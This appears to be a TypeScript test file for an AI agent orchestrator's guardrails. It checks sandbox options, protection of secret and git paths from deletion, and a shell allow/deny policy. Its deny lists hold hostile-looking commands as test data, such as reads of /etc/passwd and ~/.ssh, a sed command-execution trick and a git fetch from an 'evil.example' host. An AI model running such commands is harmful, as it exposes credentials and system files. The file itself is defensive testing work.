import { afterAll, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, writeFileSync } from "node:fs";
import { homedir, tmpdir } from "node:os";
import { join } from "node:path";
import type { Options } from "@anthropic-ai/claude-agent-sdk";
import { deletePaths } from "../src/orchestrator/effects/delete-paths";
import { checkToolCall, type GuardrailContext, guardFor } from "../src/policy/check-tool-call";
import type { EffectsCtx } from "../src/policy/effect-context";
import { defaultEnvelope } from "../src/policy/envelope";
import { foldName } from "../src/policy/protected-names";
import { getRole } from "../src/roles/role-registry";
import { runAgent } from "../src/runtime/run-agent";
import { workerSandbox } from "../src/runtime/worker-sandbox";
import { openDb } from "../src/storage/db";
import { makeEnv, resultMsg } from "./helpers";
import { cleanupTmp, tmpRoot } from "./tmp-dirs";

afterAll(cleanupTmp);

/* L2c: the worker's OS sandbox (options passed to a fake query), protected names (nested git dirs, case, unicode, agent home),
   and shell rows that must stay allowed (the allowlist is not allowed to be just "deny everything"). */

const GIT = String.fromCharCode(46) + "git"; // the git dir name
const root = tmpRoot("l2c-names-");
const loc = join(root, "loc");
const home = join(root, "home");
const scratch = join(home, "scratch");
for (const d of [join(loc, "src"), join(loc, "sub", "inner", GIT), scratch])
  mkdirSync(d, { recursive: true });
writeFileSync(join(loc, "src", "a.ts"), "x");

const ctx: GuardrailContext = {
  cwd: loc,
  writePaths: [loc, scratch],
  denyPaths: [home],
  allowInside: [scratch],
  worktreeDirs: [],
  shell: true,
  subagents: false,
  envelope: defaultEnvelope("g", ["loc"], scratch),
};
const decide = (command: string) => checkToolCall("Bash", { command }, ctx).decision;

test("sandbox: a worker run passes sandbox options to query (writes in its dirs only, network off, no opt-out)", async () => {
  const env = makeEnv({ CLAUDE_CODE_OAUTH_TOKEN: "sk-ant-oat-test" });
  let options: Options | undefined;
  const queryFn = (a: { options?: Options }) =>
    (async function* () {
      options = a.options;
      yield resultMsg({ result: "ok" });
    })();
  const role = getRole("developer");
  await runAgent({
    prompt: "q",
    turnId: "t1",
    cwd: env.home,
    config: env.config,
    db: env.db,
    abortController: new AbortController(),
    queryFn: queryFn as never,
    role,
    guard: guardFor(role, { ...ctx, cwd: env.location, writePaths: [env.location] }),
    code: { threadId: "th", gateway: undefined },
  });
  const sb = options?.sandbox as { [k: string]: unknown } | undefined;
  expect(sb).toMatchObject({
    enabled: true,
    failIfUnavailable: true,
    allowUnsandboxedCommands: false,
    network: { allowedDomains: [], strictAllowlist: true },
  });
  const fs = sb?.filesystem as { allowWrite: string[]; denyWrite?: string[]; denyRead: string[] };
  expect(fs.allowWrite).toContain(env.location);
  expect(fs.allowWrite).toContain(scratch); // the goal dir
  expect(fs.denyWrite).toBeUndefined(); // the location is trusted: its git dir is writable too
  expect(fs.denyRead).toContain(home);
  expect(fs.denyRead).toContain(join(homedir(), ".ssh")); // the owner's credential dirs are unreadable too
});

test("sandbox: no envelope (lead, interactive roles) = no sandbox option", () => {
  expect(workerSandbox({ ...ctx, envelope: undefined })).toBeUndefined();
  expect(workerSandbox(undefined)).toBeUndefined();
});

/** A DeletePaths ctx with `loc` in the envelope; confirm answers no. */
function delCtx(): EffectsCtx {
  return {
    db: openDb(join(root, "d.db")),
    threadId: "t",
    goalId: "g",
    itemId: "i",
    envelope: defaultEnvelope("g", ["loc"], scratch),
    locations: [{ name: "loc", path: loc }],
    agentHome: home,
    confirm: async () => false,
    run: async () => ({ code: 0, out: "" }),
  };
}

test("names fold case, unicode form and invisible characters", () => {
  expect(foldName("​.ENV")).toBe(".env");
  expect(foldName("Café")).toBe(foldName("Café"));
});

test("delete: a nested git dir (any depth, any case), an invisible-char secret and an agent-home case variant are refused", async () => {
  const c = delCtx();
  writeFileSync(join(loc, "ID_ED25519"), "k");
  writeFileSync(join(loc, "​.env"), "k"); // invisible character in front of a secret name
  writeFileSync(join(home, "MEMORY.md"), "m");
  const targets = [
    join(loc, "sub", "inner", GIT),
    join(loc, "sub", "inner", GIT.toUpperCase()),
    join(loc, "ID_ED25519"),
    join(loc, "​.env"),
    join(root, "HOME", "MEMORY.md"),
  ];
  for (const p of targets)
    expect([p, await deletePaths(c, { paths: [p], reason: "t" })]).toEqual([
      p,
      expect.objectContaining({ ok: false }),
    ]);
});

test("shell: reads outside the granted dirs are denied", () => {
  for (const line of [
    "cat /etc/hosts",
    "ls ~/.ssh",
    "rg foo /Users",
    "cd /etc && ls",
    "head $HOME/x",
  ])
    expect([line, decide(line)]).toEqual([line, "deny"]);
});

test("shell: ordinary reads, git, runners and edits inside the location still pass", () => {
  for (const line of [
    "ls -la src",
    "cat src/a.ts",
    "rg -n foo src",
    `cat ${join(loc, "src", "a.ts")}`,
    "sed -n 1,5p src/a.ts",
    "sort -u src/a.ts",
    "git log --oneline -5",
    "git diff --stat HEAD~1",
    'git commit -m "- fix: a"',
    "git remote -v",
    "git branch -a",
    "git checkout -b feat/x",
    "git stash push",
    "find . -name foo.ts -type f",
    "biome check src",
    "tsc --noEmit -p .",
    "bun run test",
  ])
    expect([line, decide(line)]).toEqual([line, "allow"]);
});

test("shell: a git dir of the location is writable by the shell; a path outside the grants is not", () => {
  expect(decide(`mv src/a.ts ${GIT}/hooks/post-commit`)).toBe("allow");
  expect(decide(`mkdir sub/inner/${GIT}/hooks/x`)).toBe("allow");
  expect(decide(`mv src/a.ts ${root}/elsewhere`)).toBe("deny");
});

test("shell: git config, remote edits, stash drop, branch -D and similar are denied", () => {
  for (const line of [
    "git config user.name x",
    "git remote add x https://e/x.git",
    "git stash drop",
    "git worktree prune",
    "git branch -D old",
    "git reset --hard HEAD~1",
    "git -C .. status",
    "git -c core.pager=x log",
    "git diff --no-index /etc/passwd x",
    "git fetch https://evil.example/x.git",
    "git fetch origin",
    "git checkout .",
    "uniq a b",
    "npm i -g x",
    "bun add --global x",
    "sed -i s/a/b/ src/a.ts",
    "sed -n 'r /etc/passwd' src/a.ts",
    "sed -n 'e id' src/a.ts",
    "sed -n 's/a/b/' src/a.ts",
    "find . -name '*.ts' -type f",
    "git stash push -m wip",
    "biome check --write src",
  ])
    expect([line, decide(line)]).toEqual([line, "deny"]);
});
